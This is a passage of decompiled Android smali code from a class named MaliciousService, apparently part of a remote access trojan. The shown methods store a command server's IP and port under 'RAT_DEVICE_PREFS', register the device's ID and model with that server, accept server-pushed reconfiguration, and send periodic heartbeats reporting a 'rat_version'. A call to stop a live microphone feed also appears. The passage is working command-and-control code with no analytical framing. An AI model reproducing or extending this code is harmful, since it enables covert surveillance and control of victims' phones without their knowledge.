    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$6()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 532
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->stopLiveMic()V

    .line 533
    const/4 v0, 0x0

    return-object v0
.end method

.method private loadServerConfigFromPreferences()V
    .registers 6

    .line 227
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 228
    const-string v1, "server_ip"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 229
    const-string v1, "server_port"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    .line 230
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    const-string v1, "MaliciousService"

    if-eqz v0, :cond_53

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_53

    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    if-eqz v0, :cond_53

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_53

    .line 231
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Loaded server config from SharedPreferences: IP="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ", Port="

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_5c

    .line 233
    :cond_53
    const-string v0, "Server IP/Port not found in SharedPreferences."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 234
    iput-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 235
    iput-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    .line 237
    :goto_5c
    return-void
.end method

.method private registerDeviceWithServer()V
    .registers 12

    .line 327
    const-string v0, "server_config"

    const-string v1, ":"

    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 328
    iget-object v3, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    .line 329
    const-string v4, "MaliciousService"

    if-eqz v2, :cond_19c

    if-eqz v3, :cond_19c

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v5, :cond_14

    goto/16 :goto_19c

    .line 333
    :cond_14
    nop

    .line 335
    const/4 v5, 0x0

    :try_start_16
    new-instance v6, Ljava/net/URL;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "http://"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "/api/register_device"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 336
    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljava/net/HttpURLConnection;
    :try_end_42
    .catch Ljava/io/IOException; {:try_start_16 .. :try_end_42} :catch_175
    .catch Lorg/json/JSONException; {:try_start_16 .. :try_end_42} :catch_173
    .catchall {:try_start_16 .. :try_end_42} :catchall_171

    .line 337
    :try_start_42
    const-string v5, "POST"

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 338
    const-string v5, "Content-Type"

    const-string v7, "application/json; charset=utf-8"

    invoke-virtual {v6, v5, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 339
    const/4 v5, 0x1

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 340
    const/16 v5, 0x2710

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 341
    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 342
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 343
    const-string v7, "device_id"

    iget-object v8, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 344
    const-string v7, "device_type"

    sget-object v8, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 345
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7
    :try_end_71
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_71} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_42 .. :try_end_71} :catch_16c
    .catchall {:try_start_42 .. :try_end_71} :catchall_169

    .line 346
    :try_start_71
    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    sget-object v8, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v5, v8}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/io/OutputStream;->write([B)V

    .line 347
    invoke-virtual {v7}, Ljava/io/OutputStream;->flush()V
    :try_end_81
    .catchall {:try_start_71 .. :try_end_81} :catchall_15d

    .line 348
    if-eqz v7, :cond_86

    :try_start_83
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V

    .line 349
    :cond_86
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v5

    .line 350
    const/16 v7, 0xc8

    if-ne v5, v7, :cond_141

    .line 351
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v5
    :try_end_92
    .catch Ljava/io/IOException; {:try_start_83 .. :try_end_92} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_83 .. :try_end_92} :catch_16c
    .catchall {:try_start_83 .. :try_end_92} :catchall_169

    .line 352
    :try_start_92
    new-instance v7, Ljava/io/BufferedReader;

    new-instance v8, Ljava/io/InputStreamReader;

    invoke-direct {v8, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v7, v8}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_9c
    .catchall {:try_start_92 .. :try_end_9c} :catchall_135

    .line 353
    :try_start_9c
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 355
    :goto_a1
    invoke-virtual {v7}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    if-eqz v9, :cond_ab

    .line 356
    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_a1

    .line 358
    :cond_ab
    new-instance v9, Lorg/json/JSONObject;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v9, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 359
    const-string v8, "status"

    invoke-virtual {v9, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v10, "registered"

    invoke-virtual {v8, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_11d

    .line 360
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Device registered successfully with server: "

    invoke-virtual {v8, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 361
    invoke-virtual {v9, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_122

    .line 362
    invoke-virtual {v9, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    .line 363
    const-string v1, "ip"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 364
    const-string v2, "port"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 365
    if-eqz v1, :cond_11c

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_11c

    if-eqz v0, :cond_11c

    .line 366
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_11c

    .line 367
    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_116

    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_11c

    .line 368
    :cond_116
    invoke-direct {p0, v1, v0}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 369
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 372
    :cond_11c
    goto :goto_122

    .line 374
    :cond_11d
    const-string v0, "Server registration status not \'registered\'."

    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_122
    .catchall {:try_start_9c .. :try_end_122} :catchall_12b

    .line 376
    :cond_122
    :goto_122
    :try_start_122
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_125
    .catchall {:try_start_122 .. :try_end_125} :catchall_135

    if-eqz v5, :cond_12a

    :try_start_127
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_12a
    .catch Ljava/io/IOException; {:try_start_127 .. :try_end_12a} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_127 .. :try_end_12a} :catch_16c
    .catchall {:try_start_127 .. :try_end_12a} :catchall_169

    .line 351
    :cond_12a
    goto :goto_157

    :catchall_12b
    move-exception v0

    :try_start_12c
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_12f
    .catchall {:try_start_12c .. :try_end_12f} :catchall_130

    goto :goto_134

    :catchall_130
    move-exception v1

    :try_start_131
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_134
    throw v0
    :try_end_135
    .catchall {:try_start_131 .. :try_end_135} :catchall_135

    :catchall_135
    move-exception v0

    if-eqz v5, :cond_140

    :try_start_138
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_13b
    .catchall {:try_start_138 .. :try_end_13b} :catchall_13c

    goto :goto_140

    :catchall_13c
    move-exception v1

    :try_start_13d
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_140
    :goto_140
    throw v0

    .line 378
    :cond_141
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Server responded with non-OK code for registration: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_157
    .catch Ljava/io/IOException; {:try_start_13d .. :try_end_157} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_13d .. :try_end_157} :catch_16c
    .catchall {:try_start_13d .. :try_end_157} :catchall_169

    .line 383
    :goto_157
    if-eqz v6, :cond_195

    .line 384
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_195

    .line 345
    :catchall_15d
    move-exception v0

    if-eqz v7, :cond_168

    :try_start_160
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V
    :try_end_163
    .catchall {:try_start_160 .. :try_end_163} :catchall_164

    goto :goto_168

    :catchall_164
    move-exception v1

    :try_start_165
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_168
    :goto_168
    throw v0
    :try_end_169
    .catch Ljava/io/IOException; {:try_start_165 .. :try_end_169} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_165 .. :try_end_169} :catch_16c
    .catchall {:try_start_165 .. :try_end_169} :catchall_169

    .line 383
    :catchall_169
    move-exception v0

    move-object v5, v6

    goto :goto_196

    .line 380
    :catch_16c
    move-exception v0

    goto :goto_16f

    :catch_16e
    move-exception v0

    :goto_16f
    move-object v5, v6

    goto :goto_176

    .line 383
    :catchall_171
    move-exception v0

    goto :goto_196

    .line 380
    :catch_173
    move-exception v0

    goto :goto_176

    :catch_175
    move-exception v0

    .line 381
    :goto_176
    :try_start_176
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Failed to register device with server: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_190
    .catchall {:try_start_176 .. :try_end_190} :catchall_171

    .line 383
    if-eqz v5, :cond_195

    .line 384
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 387
    :cond_195
    :goto_195
    return-void

    .line 383
    :goto_196
    if-eqz v5, :cond_19b

    .line 384
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 386
    :cond_19b
    throw v0

    .line 330
    :cond_19c
    :goto_19c
    const-string v0, "Server IP/Port not loaded or Device ID not ready, cannot register device."

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 331
    return-void
.end method

.method private saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V
    .registers 5

    .line 240
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 241
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 242
    const-string v1, "server_ip"

    invoke-interface {v0, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 243
    const-string v1, "server_port"

    invoke-interface {v0, v1, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 244
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 245
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Saved server config to SharedPreferences: IP="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, ", Port="

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "MaliciousService"

    invoke-static {p2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 246
    return-void
.end method

.method private sendHeartbeat()V
    .registers 9

    .line 834
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 835
    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    .line 836
    const-string v2, "MaliciousService"

    if-eqz v0, :cond_119

    if-eqz v1, :cond_119

    iget-object v3, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v3, :cond_10

    goto/16 :goto_119

    .line 840
    :cond_10
    nop

    .line 842
    const/4 v3, 0x0

    :try_start_12
    new-instance v4, Ljava/net/URL;

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v6, ":"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/api/heartbeat/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v4, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 843
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;
    :try_end_46
    .catch Ljava/io/IOException; {:try_start_12 .. :try_end_46} :catch_e6
    .catch Lorg/json/JSONException; {:try_start_12 .. :try_end_46} :catch_e4
    .catchall {:try_start_12 .. :try_end_46} :catchall_e2

    .line 844
    :try_start_46
    const-string v1, "POST"

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 845
    const-string v1, "Content-Type"

    const-string v3, "application/json; charset=utf-8"

    invoke-virtual {v0, v1, v3}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 846
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 847
    const/16 v1, 0x1388

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 848
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 849
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 850
    const-string v3, "device_id"

    iget-object v4, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 851
    const-string v3, "rat_version"

    const-string v4, "1.0"

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 852
    const-string v3, "device_type"

    sget-object v4, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 853
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3
    :try_end_7c
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_7c} :catch_df
    .catch Lorg/json/JSONException; {:try_start_46 .. :try_end_7c} :catch_dd
    .catchall {:try_start_46 .. :try_end_7c} :catchall_da

    .line 854
    :try_start_7c
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v4, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v4}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/io/OutputStream;->write([B)V

    .line 855
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
    :try_end_8c
    .catchall {:try_start_7c .. :try_end_8c} :catchall_ce

    .line 856
    if-eqz v3, :cond_91

    :try_start_8e
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    .line 857
    :cond_91
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    .line 858
    const/16 v3, 0xc8

    if-ne v1, v3, :cond_b2

    .line 859
    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Heartbeat sent successfully for device: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_c8

    .line 861
    :cond_b2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Server responded with non-OK code for heartbeat: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_c8
    .catch Ljava/io/IOException; {:try_start_8e .. :try_end_c8} :catch_df
    .catch Lorg/json/JSONException; {:try_start_8e .. :try_end_c8} :catch_dd
    .catchall {:try_start_8e .. :try_end_c8} :catchall_da

    .line 866
    :goto_c8
    if-eqz v0, :cond_112

    .line 867
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_112

    .line 853
    :catchall_ce
    move-exception v1

    if-eqz v3, :cond_d9

    :try_start_d1
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    :try_end_d4
    .catchall {:try_start_d1 .. :try_end_d4} :catchall_d5

    goto :goto_d9

    :catchall_d5
    move-exception v3

    :try_start_d6
    invoke-static {v1, v3}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_d9
    :goto_d9
    throw v1
    :try_end_da
    .catch Ljava/io/IOException; {:try_start_d6 .. :try_end_da} :catch_df
    .catch Lorg/json/JSONException; {:try_start_d6 .. :try_end_da} :catch_dd
    .catchall {:try_start_d6 .. :try_end_da} :catchall_da

    .line 866
    :catchall_da
    move-exception v1

    move-object v3, v0

    goto :goto_113

    .line 863
    :catch_dd
    move-exception v1

    goto :goto_e0

    :catch_df
    move-exception v1

    :goto_e0
    move-object v3, v0

    goto :goto_e7

    .line 866
    :catchall_e2
    move-exception v1

    goto :goto_113

    .line 863
    :catch_e4
    move-exception v1

    goto :goto_e7

    :catch_e6
    move-exception v1

    .line 864
    :goto_e7
    :try_start_e7
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Failed to send heartbeat for device "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ": "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_10d
    .catchall {:try_start_e7 .. :try_end_10d} :catchall_e2

    .line 866
    if-eqz v3, :cond_112

    .line 867
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 870
    :cond_112
    :goto_112
    return-void

    .line 866
    :goto_113
    if-eqz v3, :cond_118

    .line 867
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 869
    :cond_118
    throw v1

    .line 837
    :cond_119
    :goto_119
